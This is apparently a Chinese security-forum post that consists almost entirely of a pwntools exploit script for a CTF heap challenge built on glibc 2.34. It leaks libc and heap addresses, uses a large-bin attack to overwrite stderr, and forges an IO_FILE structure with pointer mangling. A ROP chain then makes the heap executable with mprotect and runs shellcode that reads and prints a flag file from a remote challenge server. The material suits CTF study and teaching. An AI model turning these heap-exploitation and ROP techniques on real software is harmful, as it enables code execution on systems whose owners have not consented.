
# [冰与火的战歌：Windows内核攻防实战高级班！从零到实战，融合AI与Windows内核攻防全技术栈，打造具备自动化能力的内核开发高手。](https://www.kanxue.com/book-section_list-227.htm)

```python
from pwn import *
rol = lambda val, r_bits, max_bits: \
    (val << r_bits % max_bits) & (2**max_bits - 1) | \
    ((val & (2**max_bits - 1)) >> (max_bits - (r_bits % max_bits)))
ror = lambda val, r_bits, max_bits: \
    ((val & (2**max_bits - 1)) >> r_bits % max_bits) | \
    (val << (max_bits - (r_bits % max_bits)) & (2**max_bits - 1))
context.binary = './main'

def add(index, size):
    return '\x01' + chr(index) + p16(size)

def free(index):
    return '\x02' + chr(index)

def show(index):
    return '\x03' + chr(index)

def edit(index, content):
    return '\x04' + chr(index) + p16(len(content)) + content

p = process('./main')
p = remote('123.57.132.168', 23774)
libc = ELF('./libc-2.34.so')

payload = add(1, 0x500)
payload += add(0, 0x440) #0
payload += add(1, 0x500) #1
payload += add(2, 0x430) #2
payload += add(3, 0x500) #3
payload += add(4, 0x470) #4
payload += add(5, 0x500) #5
payload += add(6, 0x480) #6
payload += add(7, 0x500) #7
payload += free(0)
payload += free(2)
payload += show(0)
payload += show(2)
payload += '\x05'
p.sendline(payload)

libc_base = u64(p.recvuntil('\x7F')[-6:].ljust(8, '\x00')) - 0x1F2CC0
log.info('LIBC:\t' + hex(libc_base))
p.recvuntil('Show Done\n')
heap_base = u64(p.recv(6).ljust(8, '\x00')) - 0x22A0 - 0x510
log.info('HEAP:\t' + hex(heap_base))

payload = add(0, 0x440) #0
payload += add(2, 0x430) #2
payload += free(0)
payload += add(1, 0x500)
payload += free(2)
payload += edit(0, p64(libc_base + 0x1F2CC0 - 0x60 + 1120) * 2 + p64(heap_base + 0x2C00 + 0x510) + p64(libc_base - 0x2890 - 0x20))
payload += add(1, 0x500)
payload += add(2, 0x430)
payload += free(2)
payload += edit(0, p64(libc_base + 0x1F2CC0 - 0x60 + 1120) * 2 + p64(heap_base + 0x2C00 + 0x510) + p64(libc_base + libc.sym['stderr'] - 0x20))
payload += add(1, 0x500)
payload += add(2, 0x430)
payload += free(2)

rand_key = heap_base + 0x27B0
fake_IO_FILE = '\x00' * 0x20
fake_IO_FILE += '\x00' * 0x28
fake_IO_FILE += p64(0xFFFFFFFFFFFFFFFF)
fake_IO_FILE += p64(0) + p64(libc_base + 0x1F5720) + p64(0xFFFFFFFFFFFFFFFF)
fake_IO_FILE += p64(0) + p64(libc_base + 0x1F2980)
fake_IO_FILE += '\x00' * 0x18 + p64(0xFFFFFFFF) + '\x00' * 0x10 + p64(libc_base + 0x1F3AE0 + 0x40)

R = rol(((libc_base + 0x00000000001482BA) ^ rand_key), 0x11, 64)
fake_IO_FILE += p64(heap_base + 0x27B0 + 0x100) + p64(0) + p64(R) + p64(0)
fake_IO_FILE += '\x00' * 0x28 + p64(libc_base + 0x52D72) + '\x00' * 0x18 + p64(heap_base + 0x27B0 + 0x100 + 0x50) + '\x00' * 0x8 + p64(libc_base + 0x00000000001405A7) + p64(0) + p64(heap_base + 0x27B0 + 0x100) + p64(0)

pop_rdi_ret = libc_base + 0x000000000002DAA2
pop_rsi_ret = libc_base + 0x0000000000037C0A
pop_rdx_rbx = libc_base + 0x0000000000087729

fake_IO_FILE += '\x00' * 0x20 + p64(pop_rdi_ret) + p64(heap_base) + p64(pop_rsi_ret) + p64(0x8000) + p64(pop_rdx_rbx) + p64(7) + p64(0)
fake_IO_FILE += p64(libc_base + libc.sym['mprotect']) + p64(heap_base + 0x27B0 + 0x100 + 0x100 - 0x20)
fake_IO_FILE += asm('''
mov rax, 0x67616c662f2e ;
push rax
mov rdi, rsp ;
mov rsi, 0 ;
xor rdx, rdx ;
mov rax, 2 ;
syscall
mov rdi, rax ;
mov rsi,rsp ;
mov rdx, 1024 ;
mov rax,0 ;
syscall
mov rdi, 1 ;
mov rsi, rsp ;
mov rdx, rax ;
mov rax, 1 ;
syscall
mov rdi, 0 ;
mov rax, 60
syscall
''')
payload += edit(0, p64(libc_base + 0x1F2CC0 - 0x60 + 1120) * 2 + p64(heap_base + 0x2C00 + 0x510) + p64(libc_base + 0x1F2CC0 - 0x20) + fake_IO_FILE)
payload += add(1, 0x500)
payload += '\x05'
p.sendline(payload)
p.interactive()
```

## 上传的附件：

- [`pwn.zip`](javascript:void(0);)（6.45MB，129次下载）
